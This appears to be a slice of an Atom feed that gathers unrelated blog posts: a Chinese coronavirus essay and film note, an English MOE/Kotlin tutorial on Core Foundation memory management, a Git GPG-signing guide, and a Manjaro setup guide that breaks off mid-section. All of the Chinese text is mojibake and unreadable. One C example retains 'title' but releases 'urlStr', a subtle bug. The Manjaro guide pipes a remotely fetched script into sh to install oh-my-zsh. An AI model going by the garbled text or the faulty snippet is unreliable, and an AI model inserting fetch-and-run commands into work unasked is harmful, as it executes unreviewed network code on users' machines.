æ‰›ä¸ä½å…ç–«ç³»ç»Ÿã€ç—…æ¯’ã€åŒ»ç–—æ‰‹æ®µã€å¹¶å‘ç—‡ä¸­ä»»ä½•ä¸€è€…çš„â€œæ¯’æ€§â€ï¼Œé‚£å°±ä¸€å‘½å‘œå‘¼äº†ï¼Œåä¹‹å°±æ˜¯æ²»å¥½äº†ã€‚</p>
<h3>è§£é“ƒè¿˜é¡»ç³»é“ƒäºº</h3>
<p>ç†è®ºä¸Šè®²ï¼Œå¦‚æœèƒ½å°†æ‰€æœ‰ç—…äººéš”ç¦»ï¼Œè¿™ä¸ªä¼ æŸ“ç—…å°±å¾—åˆ°æ§åˆ¶äº†ï¼Œä½†æ˜¯å¾€å¾€æ”¿åºœçš„å¼ºå¤§è°ƒç”¨èƒ½åŠ›åœ¨å¤©ç¾é¢å‰å¾€å¾€æ˜¾å¾—é‚£ä¹ˆè‹ç™½æ— åŠ›ã€‚ä»¥éå…¸ä¸ºä¾‹ï¼Œæœ€ç»ˆå¤©æ°”å˜çƒ­äº†ï¼Œéå…¸å¤±å»äº†é€‚å®œçš„ç”Ÿå­˜ç¯å¢ƒï¼Œç„¶åéå…¸å°±æ¶ˆå¤±äº†ã€‚</p>
<p>å½“å¹´çš„éå¸¸åœ¨å¤©æ°”å˜çƒ­çš„æ—¶å€™ï¼Œå°±ä¸é€‚å®œäº†ï¼Œè¿™æ¬¡2019-ncovæ˜¯å¦ä¹Ÿèƒ½å¦‚æ­¤å‘¢ï¼Ÿé™¢å£«ä»¬è®²çš„å¾ˆå¿«å°±ä¼šå‡ºç°æ‹ç‚¹æ˜¯å¦ä¼šå‡ºç°å‘¢ï¼Ÿ2020å¹´æœ‰äº†2003å¹´éš¾ä»¥æƒ³è±¡çš„äººå£æµåŠ¨ï¼Œæ˜¯å¦æ„å‘³ç€è¿™ä¸€æ¬¡å°†ä¼šæ›´éš¾åº¦è¿‡å‘¢ï¼Ÿ</p>
<p>è®©æ—¶é—´ç»™æˆ‘ä»¬ç­”æ¡ˆå§ã€‚æˆ‘ä»¬ç°åœ¨èƒ½åšçš„ä¹Ÿæ˜¯åšå¥½è‡ªèº«é˜²æŠ¤ï¼Œå†·é™åº”å¯¹ï¼Œåˆ¶å®šè‡ªèº«æå‡æ–¹æ¡ˆï¼Œäº‰å–åœ¨è¿™æ¬¡â€œè§æ¡â€ä¹‹åèƒ½å¤Ÿæ­£å¸¸å¯èˆªã€‚</p>]]></content>
        <author>
            <name><![CDATA[è‹ç‘è¾…çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/381</id>
        <title><![CDATA[å¿ƒæ€è€Œä¸æ˜¯çœŸç›¸ï¼ˆè§‚ã€Šè¢«å…‰å¸¦èµ°çš„äººã€‹æœ‰æ„Ÿï¼‰]]></title>
        <updated>2020-01-30T10:17:47+08:00</updated>
        <link href="https://www.suruifu.com/posts/381"/>
        <content type="text/html" src="https://www.suruifu.com/posts/381"><![CDATA[<p><strong><em>æœ¬æ–‡ä½œè€…å°æ‰</em></strong><br />
ç™½å…‰æ˜¯ä»€ä¹ˆï¼Ÿæ²¡æœ‰ç»“è®ºï¼Œä¹Ÿä¸éœ€è¦ç»“è®ºã€‚å› ä¸ºå®ƒæ˜¯å¦å­˜åœ¨ç»“è®ºå·²ç»ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯äººä»¬å¦‚ä½•ç†è§£å®ƒï¼Œå¦‚ä½•é¢å¯¹å®ƒã€‚</p>
<p>ç»å†æŠ—æ‹’ã€ææ…Œã€ç²¾ç¥å¿ƒæ€å—åˆ°ä¸¥é‡å½±å“ã€å›å½’æ–°å¸¸æ€ã€‚é‡è¦çš„ä¸æ˜¯çªå‘äº‹ä»¶çš„å‘ç”Ÿè€Œæ˜¯å¦‚ä½•å¯¹å¾…äº‹ä»¶å’Œå¦‚ä½•å¯¹å¾…è‡ªå·±çš„å†…å¿ƒã€‚</p>]]></content>
        <author>
            <name><![CDATA[è‹ç‘è¾…çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/moe-native-types.html</id>
        <title><![CDATA[Working with native types: Advanced]]></title>
        <updated>2019-09-22T05:23:17+08:00</updated>
        <link href="https://www.noisyfox.io/moe-native-types.html"/>
        <content type="text/html" src="https://www.noisyfox.io/moe-native-types.html"><![CDATA[<p>After using MOE for several years we discovered some common problems when dealing with native types (Core Foundation Types &amp; Cocoa Types). Here are some of our findings.</p>



<h1>Container Types (NSArray, NSDictionary, CFArrayRef, etc.)</h1>



<ol><li>The content in those containers must be corresponding native types, e.g., values of a <code>NSArray</code> must all be <code>NSObject</code>s, while values of a <code>CFArrayRef</code> must all be <code>OpaquePtr</code>s.<ol><li>NatJ does not automatically convert Java-only types (include primitive types) to compatible native types and vice versa when dealing with containers. When adding values to those containers you need to manually convert it to a corresponding native type. And when reading the value you also need to explicitly convert it to a Java type.</li><li>If you try to store a <strong>Core Foundation</strong> type in a <strong>Cocoa</strong> container, you need to cast it using the <strong>Toll-Free Bridging</strong> which I will talk about later.</li></ol></li><li>Arrays and dictionaries can not have <code>null</code> as either key or value.</li></ol>



<p>If you ever used the iOS <strong>KeyChain</strong> APIs you may did something similar as follows in Objective-C(simplified):</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFErrorRef error = NULL;

SecAccessControlRef access =
SecAccessControlCreateWithFlags(kCFAllocatorDefault,
                                kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
                                kSecAccessControlPrivateKeyUsage|kSecAccessControlUserPresence,
                                &amp;error);

NSData* tag = [@"some tag" dataUsingEncoding:NSUTF8StringEncoding];

NSDictionary* attributes =
@{ (id)kSecClass:                   (id)kSecClassKey,
   (id)kSecAttrKeyType:             (id)kSecAttrKeyTypeECSECPrimeRandom,
   (id)kSecAttrKeySizeInBits:       @256,
   (id)kSecAttrTokenID:             (id)kSecAttrTokenIDSecureEnclave,
   (id)kSecPrivateKeyAttrs:
       @{ (id)kSecAttrIsPermanent:    @YES,
          (id)kSecAttrApplicationTag:  tag,
          (id)kSecAttrAccessControl:  (__bridge id)access
        },
   };

SecKeyRef privateKey = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attributes,
                                             &amp;error);</pre>



<p>The corresponding Kotlin code will be:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)

val access = Security.SecAccessControlCreateWithFlags(
    CoreFoundation.CFAllocatorGetDefault(),
    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
    pError
)
val tag = NSString.stringWithString("some tag").dataUsingEncoding(NSUTF8StringEncoding)

// Helper function to convert a CF type to Cocoa type
fun OpaquePtr.toNSObject() = ObjCRuntime.cast(this, NSObject::class.java)

val privateKeyAttrs = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
privateKeyAttrs[Security.kSecAttrIsPermanent().toNSObject()] = NSNumber.numberWithBool(true) // Convert Java `boolean` to Cocoa type
privateKeyAttrs[Security.kSecAttrApplicationTag().toNSObject()] = tag
privateKeyAttrs[Security.kSecAttrAccessControl().toNSObject()] = access.toNSObject()

val attributes = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
attributes[Security.kSecClass().toNSObject()] = Security.kSecClassKey().toNSObject()
attributes[Security.kSecAttrKeyType().toNSObject()] = Security.kSecAttrKeyTypeECSECPrimeRandom().toNSObject()
attributes[Security.kSecAttrKeySizeInBits().toNSObject()] = NSNumber.numberWithInt(256) // Convert Java `int` to Cocoa type
attributes[Security.kSecAttrTokenID().toNSObject()] = Security.kSecAttrTokenIDSecureEnclave().toNSObject()
attributes[Security.kSecPrivateKeyAttrs().toNSObject()] = privateKeyAttrs

// Cast NSDictionary to CFDictionaryRef
val cfAttributes = ObjCRuntime.cast(attributes, CFDictionaryRef::class.java)

val privateKey = Security.SecKeyCreateRandomKey(cfAttributes, pError)</pre>



<p>With the help of <a href="https://github.com/Noisyfox/NatJ-Kotlin">this library</a> I created, the code can be simplified as:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)

val access = Security.SecAccessControlCreateWithFlags(
    CoreFoundation.CFAllocatorGetDefault(),
    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
    pError
)

val attributes = mapOf&lt;Any,Any>(
    Security.kSecClass() to Security.kSecClassKey(),
    Security.kSecAttrKeyType() to Security.kSecAttrKeyTypeECSECPrimeRandom(),
    Security.kSecAttrKeySizeInBits() to 256,
    Security.kSecAttrTokenID() to Security.kSecAttrTokenIDSecureEnclave(),
    Security.kSecPrivateKeyAttrs() to mapOf&lt;Any,Any>(
        Security.kSecAttrIsPermanent() to true,
        Security.kSecAttrApplicationTag() to "some tag".toNSData(),
        Security.kSecAttrAccessControl() to access
    )
).toNSDictionary()

val privateKey = Security.SecKeyCreateRandomKey(attributes.bridge(), pError)</pre>



<p>This library also has a help function for creating <code>NSArray</code> from a Java <code>Collection</code>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val nsArray = listOf(1, 2, 3, "some string", someCFRef, someNSType).toNSArray()</pre>



<h1>Toll-Free Bridging &amp; Memory Management</h1>



<p>iOS developers are most likely to be familiar with&nbsp;<strong>Cocoa Touch</strong>&nbsp;frameworks/APIs (does&nbsp;<strong>Foundation</strong>&nbsp;framework sound familiar to you?), which use the programming languages&nbsp;<strong>Objective-C</strong>&nbsp;or&nbsp;<strong>Swift</strong>. </p>



<p>However, you may also heard about another framework called&nbsp;<strong>Core Foundation</strong>.&nbsp;It is a pure&nbsp;<strong>C</strong>&nbsp;framework and provides access to lower level APIs and types.</p>



<p>For iOS development, most frameworks you will use are all designed based on the&nbsp;<strong>Foundation</strong>&nbsp;framework which means the types they use are all&nbsp;<code>NSObject</code>s so&nbsp;<strong>ARC</strong>&nbsp;manages the memory for you and the memory will be automatically released when the object is no longer used.&nbsp;<strong>MOE</strong> does some tricks so&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;also helps when you use those types on&nbsp;<strong>Java</strong>&nbsp;side.</p>



<p>However some low level functions (such as&nbsp;<strong>Security</strong>&nbsp;framework if you try to use&nbsp;<strong>TouchId</strong>) are available in only&nbsp;<strong>C</strong>&nbsp;functions. Hens they use&nbsp;<strong>Core Foundation</strong>&nbsp;types which does not have&nbsp;<strong>ARC</strong>&nbsp;and requires manual memory management. Sadly&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;does no help here (and may even create new issues which I will talk about later).</p>



<h2 id="ownership-cfretain-and-cfrelease">Ownership, CFRetain() and CFRelease()</h2>



<p>Anyone has any&nbsp;<strong>C</strong>&nbsp;experience might still remember those good old days struggling with&nbsp;<code>malloc()</code>&nbsp;and&nbsp;<code>free()</code>&nbsp;while&nbsp;<strong>Core Foundation</strong>&nbsp;brings you&nbsp;<code>CFRetain()</code>&nbsp;and&nbsp;<code>CFRelease()</code>.</p>



<p>Apple has a fantastic document that tells you how&nbsp;<em>Ownership</em>&nbsp;works in manual memory management and when you should use&nbsp;<code>CFRetain()</code>and&nbsp;<code>CFRelease()</code>&nbsp;respectively. I highly recommend you to read it first:</p>



<p>Link:&nbsp;<a href="https://developer.apple.com/library/archive/documentation/CoreFoundation/Conceptual/CFMemoryMgmt/Concepts/Ownership.html">Memory Management Programming Guide for Core Foundation &#8211; Ownership Policy</a></p>



<p>Basically if an Core Foundation object is owned by you, you need to call&nbsp;<code>CFRelease()</code>&nbsp;once you are done with it; if it&#8217;s NOT owned by you, in most cases, you need to&nbsp;<code>CFRetain()</code>&nbsp;it, use it, then&nbsp;<code>CFRelease()</code>&nbsp;it afterwards:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Create a CFString, which is owned by you
CFStringRef urlStr = CFStringCreateWithCString(kCFAllocatorDefault,
    "https://www.noisyfox.io", kCFStringEncodingUTF8);

/* Do something with urlStr here. */

// Release it afterwards
CFRelease(urlStr);
</pre>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Get something from a dict, which is not owned, so a CFRetain() is required
CFStringRef title = (CFStringRef)CFRetain(CFDictionaryGetValue(dict, CFSTR("title")));

/* Do something with title here. */

// Release it afterwards
CFRelease(urlStr);
</pre>



<p>You can easily convert above code to&nbsp;<strong>Java</strong>&nbsp;since MOE bindings provide all necessary functions. And with a little help from my library, you could write something like these in&nbsp;<strong>Kotlin</strong>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).use { key ->

    CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().use { title ->
        /* Do something with title here. */
    }
}
// CFRelease is automatically called when block returns
</pre>



<p>The&nbsp;<code>action</code>&nbsp;block of&nbsp;<code>.use()</code>&nbsp;is wrapped in a&nbsp;<code>try</code>&nbsp;block so the resource is guaranteed to be released even if&nbsp;<strong>Exception</strong>&nbsp;is raised in the block.</p>



<h2 id="autoreleasepool-for-core-foundation-types"><code>autoreleasepool</code>&nbsp;for&nbsp;<strong>Core Foundation</strong>&nbsp;types</h2>



<p><code>.use()</code>&nbsp;mentioned above will create a lot of nested scopes if you have a lot of those&nbsp;<strong>Core Foundation</strong>&nbsp;objects. That makes the code unreadable. With the help of&nbsp;<code>autoreleasepool</code>&nbsp;you could rewrite the above code to something like this:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">autoreleasepool {
    val key = CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).autorelease()
    val title = CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().autorelease()

    /* Do something with title here. */
}
// CFRelease is automatically called for each object that called .autorelease() when autoreleasepool block ends
</pre>



<p><strong>NB</strong>: Make sure the&nbsp;<code>autoreleasepool</code>&nbsp;you called is imported from package&nbsp;<code>io.noisyfox.moe.natj</code>&nbsp;since&nbsp;<strong>NatJ</strong>&nbsp;has it&#8217;s own impl&nbsp;<code>org.moe.natj.objc.ObjCRuntime#autoreleasepool(java.lang.Runnable)</code>&nbsp;which is not a&nbsp;<strong>Kotlin</strong>&nbsp;<code>inline</code>&nbsp;function which doesn&#8217;t support certain features (such as&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#non-local-returns">non-local returns</a>&nbsp;and&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#reified-type-parameters">reified type parameters</a>).</p>



<h2 id="type-bridging">Type Bridging</h2>



<p>WIP</p>



<h1>Misc</h1>



<p>The library also contains some other help functions for converting between Java types and native types such as <code>ByteArray</code> &lt;=&gt; <code>NSData</code>. I won&#8217;t list all functions here since you could easily find them in source code.</p>



<h1>The library &#8211; <strong><a href="https://github.com/Noisyfox/NatJ-Kotlin">NatJ-Kotlin</a></strong></h1>



<p>This is a library I created that contains some helper functions I used in my work. It&#8217;s currently available in only source code form. I will create a jar release and publish it to jcenter ASAP.</p>



<p>The library is written in Kotlin but most of the functions can also be used in Java.</p>



<h1>Discussion</h1>



<p>Any idea of  library improving are welcomed. If you found any mistake in my post, or have any other problem that is not covered, please not hesitate to share with us by leaving comments.</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/moe-native-types.html">Working with native types: Advanced</a>ï¼Œé¦–å‘äº<a rel="nofollow" href="https://www.noisyfox.io">ç‹ç‹¸çš„å°å°çª</a>ã€‚</p>]]></content>
        <author>
            <name><![CDATA[ç‹ç‹¸çš„å°å°çª]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/git-initialization/</id>
        <title><![CDATA[Git initialization]]></title>
        <updated>2019-09-01T10:37:13+08:00</updated>
        <link href="https://blog.triplez.cn/git-initialization/"/>
        <content type="text/html" src="https://blog.triplez.cn/git-initialization/"><![CDATA[<ul>
<li>Change <code>Git</code> default settings;</li>
<li>Use <code>GPG</code> key to sign the <code>Git</code> commits.</li>
</ul>
<h2>Step by step</h2>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git config --global core.editor "vim"


# config your identity
git config --global user.email "YOUR_EMAIL"
git config --global user.name "YOUR_NAME"

# enable gpg signed commit
git config --global commit.gpgsign true

# generate gpg key
## git &gt;= 2.1.17
gpg --full-generate-key
# or gpg --gen-key
## git &lt; 2.1.17
gpg --default-new-key-algo rsa4096 --gen-key

# check your key id
$ gpg --list-secret-keys --keyid-format LONG
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
/home/triplez/.gnupg/pubring.kbx
--------------------------------
sec   rsa4096/96B4168C3D454E11 2018-11-28 [SC]
      6B0B48B063F8F592CE9006DE96B4168C3D454E11
uid                 [ultimate] Zhenzhen Zhao (my gpg) &lt;me@triplez.cn&gt;
ssb   rsa4096/435B8EB04CBF8E8D 2018-11-28 [E]

gpg --armor --export 96B4168C3D454E11
# copy your GPG key, beginning with -----BEGIN PGP PUBLIC KEY BLOCK----- and ending with -----END PGP PUBLIC KEY BLOCK-----, then add it to the GitHub

# set user to sign with this gpg key
git config --global user.signingkey 96B4168C3D454E11
</code></pre>
<h2>References</h2>
<p><a href="https://help.github.com/articles/generating-a-new-gpg-key/">Generating a new GPG key</a><br />
<a href="https://stackoverflow.com/questions/52808365/git-error-gpg-failed-to-sign-the-data-on-linux">Git error: gpg failed to sign the data on Linux</a></p>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/git-initialization/">Git initialization</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/manjaro-quick-start/</id>
        <title><![CDATA[å°†å¹²å‡€çš„ Manjaro å¿«é€Ÿé…ç½®ä¸ºå·¥ä½œç¯å¢ƒ]]></title>
        <updated>2019-08-26T14:58:12+08:00</updated>
        <link href="https://blog.triplez.cn/manjaro-quick-start/"/>
        <content type="text/html" src="https://blog.triplez.cn/manjaro-quick-start/"><![CDATA[<h2><span class="ez-toc-section" id="i">åˆå§‹åŒ–é…ç½®</span></h2>
<p>å…ˆé…ç½®é•œåƒæºï¼ŒManjaro æ—©å·²å¸®æˆ‘ä»¬å®‰æ’å¥½è¿™ä¸€åˆ‡ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-sh"># é€‰å–å½“ä¸‹åœ¨å›½å†…æœ€å¿«çš„æº
$ sudo pacman-mirrors -i -c China -m rank
</code></pre>
<h3><span class="ez-toc-section" id="i-2">æ·»åŠ å›½å†…è½¯ä»¶æº</span></h3>
<p>ä¿®æ”¹ <code>/etc/pacman.conf</code> ï¼Œæ·»åŠ å¦‚ä¸‹è¯­å¥ï¼ˆæ­¤å¤„ä½¿ç”¨æ¸…å TUNA æºï¼‰ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-ini">[archlinuxcn]
SigLevel= TrustedOnly
Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch
</code></pre>
<blockquote><p>
  æ­¤å¤„å»ºè®®å…ˆ <code>sudo pacman -S vim</code>  ğŸ˜›
</p></blockquote>
<p>å®‰è£…å¯†é’¥ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -Syu archlinuxcn-keyring
</code></pre>
<blockquote><p>
  å¯èƒ½é‡åˆ° <strong>Unable to lock database</strong> é”™è¯¯ï¼Œ<a href="https://forum.manjaro.org/t/solved-not-able-to-update-unable-to-lock-database/45077/4">è§£å†³æ–¹æ¡ˆ</a>å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo rm /var/lib/pacman/db.lck
  </code></pre>
</blockquote>
<h3><span class="ez-toc-section" id="i-3">æ›´æ–°ç³»ç»Ÿ</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -Syyu
</code></pre>
<p>è®© Manjaro ä½¿ç”¨ LocalTimeï¼Œè§£å†³ä¸ Windows å…±å­˜ä¸»æ¿æ—¶é—´å†²çªé—®é¢˜ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo timedatectl set-local-rtc true
</code></pre>
<h3><span class="ez-toc-section" id="i-4">å¿…å¤‡å·¥å…·</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S yay git net-tools tree vim
</code></pre>
<blockquote><p>
  <code>yay</code> æ˜¯ AUR ç®¡ç†å·¥å…·ã€‚
</p></blockquote>
<h3><span class="ez-toc-section" id="i-5">åŒæ˜¾å¡åˆ‡æ¢</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus
$ sudo systemctl enable bumblebeed
$ sudo gpasswd -a $USER bumblebee
</code></pre>
<h3><span class="ez-toc-section" id="Emoji_Support">Emoji Support</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S noto-fonts-emoji
</code></pre>
<h2><span class="ez-toc-section" id="i-6">ç§‘å­¦ä¸Šç½‘</span></h2>
<p>è¿™æ˜¯æœ€æœ€æœ€åŸºç¡€çš„éœ€æ±‚ï¼</p>
<h3><span class="ez-toc-section" id="Shadowsocks">Shadowsocks</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S shadowsocks-qt5
</code></pre>
<p>å¯ä»¥è®¾ä¸ºå¼€æœºå¯åŠ¨ã€‚</p>
<h3><span class="ez-toc-section" id="ShadowsocksR">ShadowsocksR</span></h3>
<p><a href="https://aur.archlinux.org/packages/electron-ssr/">electron-ssr (AUR)</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S electron-ssr
</code></pre>
<h3><span class="ez-toc-section" id="Proxychains">Proxychains</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S proxychains-ng
</code></pre>
<h2><span class="ez-toc-section" id="i-7">æ—¥å¸¸è½¯ä»¶</span></h2>
<h3><span class="ez-toc-section" id="i-8">æœç‹—è¾“å…¥æ³•</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S fcitx fcitx-qt4 fcitx-im  fcitx-configtool fcitx-sogoupinyin
</code></pre>
<p>è®¾ç½® <code>fcitx</code> ä¸ºé»˜è®¤è¾“å…¥æ³•ï¼Œç¼–è¾‘ <code>~/.xprofile</code> ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-shell">export GTK_IM_MODULE=fcitx
export QT_IM_MODULE=fcitx
export XMODIFIERS=@im=fcitx
</code></pre>
<p>å®‰è£…å¿…å¤‡å­—ä½“ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S wqy-bitmapfont wqy-microhei \
  wqy-zenhei adobe-source-code-pro-fonts \
  adobe-source-han-sans-cn-fonts ttf-monaco
</code></pre>
<p>æˆ‘æœ€çˆ±çš„çš®è‚¤ï¼š<a href="https://pinyin.sogou.com/skins/detail/view/info/430641">é»‘è‰²ç§‘æŠ€</a></p>
<h3><span class="ez-toc-section" id="RIME">RIME</span></h3>
<p>RIME ä¸­å·éŸµè¾“å…¥æ³•æ˜¯ Linux ä¸‹å¹¿å—å¥½è¯„çš„ä¸­æ–‡è¾“å…¥æ³•ã€‚é‰´äºæœç‹—è¾“å…¥æ³•çš„ bug ä¸æ–­ï¼ˆQT4ï¼‰ï¼Œç¬”è€…æ›´æ¨è RIME æ¥ä½œä¸ºä¸­æ–‡è¾“å…¥æ³•ã€‚</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S fcitx-rime fcitx-cloudpinyin fcitx-googlepinyin
</code></pre>
<h3><span class="ez-toc-section" id="Telegram">Telegram</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S telegram-desktop
</code></pre>
<h3><span class="ez-toc-section" id="Dropbox">Dropbox</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S dropbox
</code></pre>
<h3><span class="ez-toc-section" id="i-9">åšæœäº‘</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S nutstore
</code></pre>
<h3><span class="ez-toc-section" id="Typora">Typora</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S typora
</code></pre>
<h3><span class="ez-toc-section" id="oh-my-zsh">oh-my-zsh</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S zsh
$ sh -c "$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
</code></pre>
<p>å®‰è£…æ’ä»¶ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git clone https://github.com/zsh-users/zsh-completions ~/.oh-my-zsh/custom/plugins/zsh-completions

$ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/plugins/zsh-syntax-highlighting

$ git clone https://github.com/zsh-users/zsh-autosuggestions.git ~/.oh-my-zsh/plugins/zsh-autosuggestions

$ vim ~/.zshrc
  # edit plugins &amp; save
  plugins=(git zsh-syntax-highlighting docker docker-compose zsh-autosuggestions zsh-completions)

$ autoload -U compinit &amp;&amp; compinit
</code></pre>
<h3><span class="ez-toc-section" id="Google_Chrome">Google Chrome</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S google-chrome
</code></pre>
<h3><span class="ez-toc-section" id="i-10">ç½‘æ˜“äº‘éŸ³ä¹</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S netease-cloud-music
</code></pre>
<h3><span class="ez-toc-section" id="MailSpring">MailSpring</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S mailspring
$ sudo pacman -S libsecret
</code></pre>
<h3><span class="ez-toc-section" id="TIM">TIM</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-wine-tim
</code></pre>
<p>è®¾ç½® DPIï¼ˆé«˜åˆ†å±ï¼‰ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ env WINEPREFIX="$HOME/.deepinwine/Deepin-TIM" winecfg
</code></pre>
<p>åœ¨ <code>Graphics</code> ä¸­å°† DPI è°ƒæ•´ä¸º <code>120</code> ã€‚</p>
<h3><span class="ez-toc-section" id="WeChat">WeChat</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-wine-wechat
</code></pre>
<p>è®¾ç½® DPIï¼ˆé«˜åˆ†å±ï¼‰ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ env WINEPREFIX="$HOME/.deepinwine/Deepin-WeChat" winecfg
</code></pre>
<p>åœ¨ <code>Graphics</code> ä¸­å°† DPI è°ƒæ•´ä¸º <code>120</code> ã€‚</p>
<h3><span class="ez-toc-section" id="Thunder_Speed">Thunder Speed (è¿…é›·)</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-wine-thunderspeed
</code></pre>
<h3><span class="ez-toc-section" id="uGet_Aria2">uGet &amp; Aria2</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S uget aria2
</code></pre>
<blockquote><p>
  å°† <code>uGet -&gt; Edit -&gt; Settings -&gt; Plug-in</code> ä¸­çš„è®¾ç½®è®¾ä¸º aria2 ã€‚
</p></blockquote>
<h3><span class="ez-toc-section" id="WPS">WPS</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S ttf-wps-fonts
$ sudo pacman -S wps-office
</code></pre>
<h3><span class="ez-toc-section" id="Redshift_Night_light">Redshift (Night light)</span></h3>
